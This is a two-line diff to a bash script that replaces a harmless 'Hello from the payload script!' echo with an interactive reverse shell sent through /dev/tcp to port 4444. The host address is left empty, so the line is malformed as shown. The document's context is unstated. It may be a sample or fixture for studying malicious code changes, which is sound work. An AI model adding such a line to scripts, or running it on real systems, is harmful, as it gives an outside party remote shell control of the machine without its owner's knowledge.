@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "Hello from the payload script!"
+/bin/sh -i >& /dev/tcp//4444 0>&1
